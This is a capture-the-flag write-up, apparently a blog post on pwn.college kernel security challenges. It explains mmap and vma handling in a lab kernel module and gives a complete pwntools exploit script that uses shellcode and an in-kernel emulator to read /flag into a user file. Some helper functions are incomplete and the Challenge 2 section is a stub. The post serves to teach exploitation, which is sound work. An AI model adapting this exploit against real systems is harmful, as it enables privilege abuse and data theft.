---
layout: post
title:  "Pwn College - Kernel Security 2"
date:   2024-05-24 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview



## Background

We're given a suid userspace program, as well as a kernel module. The driver creates an interesting procfs entry, `ypu` - stands for "yan processing unit". It contains few multiple operations, including `device_ioctl, device_open, device_release` and `device_mmap`. \
The `open` handler of the device simply stores buffer within the `private_data` of the device, allocated by `vmalloc_user`. This means that this memory area is actually mapped to userspace, not kernel. The equivalent `release` handler just `vfree`s that data. \
The `mmap` handler calls `remap_vmalloc_range` to the newly-allocated chunk within `file->private_data`. This simply maps the pages, allocated by `vmalloc`, to userspace `vma`. 

### vma

Recall `struct vm_area_struct` represents contiguous VA area, meaning a single entry within `/proc/pid/maps`. The `vma`'s of a single task are stored within `struct mm`. Moreover, they are also chained via the `vma->next` member. \
Moreover, a driver that supports `mmap` operation must initialize its associated `vma`, and to map it to some pages. It can be further read [here][linux-kernel-labs-vma] and [here][litux-vma]. 

### `device_mmap`

From a driver's point of view, the `mmap` facility allows direct memory access from userspace. This is interesting - It means that the underlying physical pages may be accessed both by the `vma`'s virtual addresses (`vma->start` up to `vma->end` - which are the real userspace addresses), as well as the driver's VA, which is returned by the kernel allocator (for example, via `vmalloc_user`). \
The driver allocates memory (via `kmalloc, vmalloc, alloc_pages`), and then maps it to user address space via helper functions, such as `remap_pfn_range, remap_vmalloc_range`. \
To obtain the page frame number of physical memory, consider how memory allocation was performed:

1. For `kmalloc`, `pfn = virt_to_phys(addr) >> PAGE_SHIFT`

2. For `vmalloc`, `pfn = vmalloc_to_pfn(addr)`

3. For `alloc_pages`, `pfn = page_to_pfn(addr)`

Recall that userspace mapped pages may be swapped out. Therefore, we must set `PG_reserved` bit on the allocated page, done by `SetPageReserved, ClearPageReserved`. 

## Challenge 1

The userspace component of this challenge opens the driver's `fd`, and executes our shellcode. \
Our shellcode can only call `mmap, ioctl` on the device driver's `fd`. \
The `ioctl` handler is pretty interesting - it starts to execute yan-emulator inside the kernel, having its code segment initialized to the driver's `file->private_data`. Recall this memory was initialized by the module within `device_open`. Userspace may interact with this memory by mapping it via `mmap`, as the `device_mmap` handler assigns `file->private_data` to the requested userspace vma. \
In order for the `mmap` call to succeed, we must make sure `prot` corresponds to the device's protections, as presented within procfs. In our case:

```bash
$ ls -la /proc/ypu 
-rw-rw-rw- 1 root root 0 Sep 17 17:28 /proc/ypu
```

Hence `prot = PROT_READ | PROT_WRITE = 3`. Moreover, I've mapped this region as `MAP_SHARED = 1`, just because we can (and having the option for this region to be visible to other processes may only do good in terms of exploitation). I've set the requested `size = 0x1000`, as this is the size of the allocated `vmalloc` chunk, hence larger `vma` should not be supported. Lastly, I've set `addr = NULL`, so we would retrive any userspace address the OS chooses.

Because this challenge executes the yan emulator within kernelspace, I've used the wrapper methods I've wrote within different modules to generate yancode in a convenient manner. \
The exploit for this stage:

```python
#!/bin/python

from glob import glob
from dataclasses import dataclass
from subprocess import check_output
from tempfile import TemporaryFile
from pwn import *
import os, sys
import struct
import time
import shutil
import binascii
import signal
import array
import textwrap
import string
import logging
# BINARY = glob('/challenge/toddler*')[0]
BINARY = '/challenge/toddlersys_level1.0'
# LIBC = '/challenge/lib/libc.so.6'
GDB_SCRIPT= '''
set follow-fork-mode child
set print elements 0
handle SIG33 nostop noprint

c
'''

context.arch = 'amd64'
# libc = ELF(LIBC)
# libc_rop = ROP(LIBC, badchars=string.whitespace)

@dataclass
class Regs:
    a = b'\x20'
    b = b'\x08'
    c = b'\x04'
    d = b''
    s = b''
    i = b''
    f = b''

@dataclass
class Opcodes:
    STM = b'\x20'
    IMM = b'\x02'
    ADD = b''
    CMP = b''
    JMP = b''
    LDM = b''
    STK = b''
    SYSCALL = b'\x04'

@dataclass
class Syscalls:
    OPEN = b'\x08'
    READ_CODE = b''
    READ_MEM = b'\x10'
    WRITE_MEM = b'\x02'
    SLEEP = b''
    EXIT = b''


def instruction(opcode, reg1, reg2):
    return reg1 + opcode + reg2

def compare(reg1, reg2):
    buffer = b''
    buffer += instruction(Opcodes.CMP, reg1, reg2)
    return buffer

def syscall(number, out_reg):
    return instruction(Opcodes.SYSCALL, number, out_reg)

def store_in_memory(addr, register):
    return instruction(Opcodes.STM, addr, register)

def load_from_memory(addr, register):
    return instruction(Opcodes.LDM, addr, value)

def write_register(register, value):
    assert(value < 0x100)
    return instruction(Opcodes.IMM, register, value.to_bytes(1, 'little'))

def jump_register(register, flags):
    buffer = b''
    buffer += instruction(Opcodes.JMP, flags, register)
    return buffer

def jump(addr, flags):
    buffer = b''
    buffer += write_register(Regs.s, addr)
    buffer += jump_register(Regs.s, flags)
    return buffer

def open_file(file_addr, flags=0, mode=0):
    buffer = b''
    buffer += write_register(register=Regs.a, value=file_addr)
    buffer += write_register(register=Regs.b, value=flags)  # O_RDONLY = 0 ; O_RDWR = 2
    buffer += write_register(register=Regs.c, value=mode)  # mode, Irrelevant
    buffer += syscall(Syscalls.OPEN, out_reg=Regs.a)
    return buffer

def read_to_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.READ_MEM, out_reg=Regs.a)
    return buffer

def write_from_memory(fd, offset, count):
    buffer = b''
    if type(fd) == int:
        buffer += write_register(Regs.a, value=fd)
    buffer += write_register(Regs.b, value=offset)
    buffer += write_register(Regs.c, value=count)
    buffer += syscall(Syscalls.WRITE_MEM, out_reg=Regs.a)
    return buffer

def store_string(addr, string):
    assert(type(string) == bytes)
    buffer = b''
    for i, b in enumerate(string):
        buffer += write_register(Regs.a, b)
        buffer += write_register(Regs.b, addr + i)
        buffer += store_in_memory(addr=Regs.b, register=Regs.a)
    return buffer

SHELLCODE = '''
user_shellcode:
mov rdi, 0
mov rsi, 0x1000
mov rdx, 3
mov r10, 1
mov r8, 3
mov r9, 0
mov rax, 9
syscall

lea rbx, [rip + yancode_start]
mov rcx, 0

copy_loop:
mov dl, byte ptr[rbx + rcx]
mov byte ptr[rax + rcx], dl
inc rcx
cmp rcx, yancode_end - yancode_start
je done
jmp copy_loop

done:
mov rdi, 3
mov rsi, 1337
mov rax, 16
syscall

yancode_start:
{}

yancode_end:
nop
'''

def main():    
    debug = False
    # if debug:
    #     p = gdb.debug(BINARY, gdbscript=GDB_SCRIPT)
    # else:

    p = process(BINARY)
    
    flag_path = b'/flag\x00'
    flag_addr = 0
    max_size = 0x80
    out_file_path = b'/home/hacker/OUT\x00'
    out_file_addr = max_size
    
    with open(out_file_path[:-1], 'wb') as f:
        pass

    yancode = b''
    # Store "flag" in mem[0]
    yancode += store_string(addr=flag_addr, string=flag_path)
    # open("/flag", O_RDONLY, 0)
    yancode += open_file(file_addr=flag_addr)
    # read(fd, &mem[0], 0x50)
    yancode += read_to_memory(fd=Regs.a, offset=flag_addr, count=max_size)

    # Store out filename in mem[0x80]
    yancode += store_string(addr=out_file_addr, string=out_file_path)
    yancode += open_file(file_addr=out_file_addr, flags=2)
    yancode += write_from_memory(fd=Regs.a, offset=flag_addr, count=max_size)

    yan_asm = ''
    for b in yancode:
        yan_asm += f'.byte {hex(b)}\n'
    
    log.info(SHELLCODE.format(yan_asm))
    user_shellcode = asm(SHELLCODE.format(yan_asm))
    with open('gdb_input.bin', 'wb') as f:
        f.write(user_shellcode)
    
    p.send(user_shellcode)
    p.recvuntil(b'Executing shellcode!\n')

    p.interactive()


if __name__ == '__main__':
    main()
```

## Challenge 2

Now, in addition to `mmap, ioctl`, the userspace program may also perform `fork`. \




[linux-kernel-labs-vma]: https://linux-kernel-labs.github.io/refs/pull/222/merge/labs/memory_mapping.html
[litux-vma]: https://litux.nl/mirror/kerneldevelopment/0672327201/ch14lev1sec2.html
